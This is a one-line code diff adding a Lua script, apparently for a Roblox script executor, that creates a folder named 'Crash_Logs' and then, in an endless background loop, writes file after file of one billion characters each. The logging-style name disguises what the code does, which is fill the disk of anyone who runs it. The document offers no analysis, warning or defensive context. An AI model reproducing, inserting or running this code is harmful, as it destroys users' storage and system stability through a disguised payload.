@@ -1,0 +1,1 @@
+if not isfolder('Crash_Logs')then makefolder('Crash_Logs')end;local a='Crash_Logs'task.spawn(function()while true do task.wait()writefile(string.format('%s/%s.txt',a,tostring(math.random(1111111,9999999))),string.rep('a',1000000000))end end)
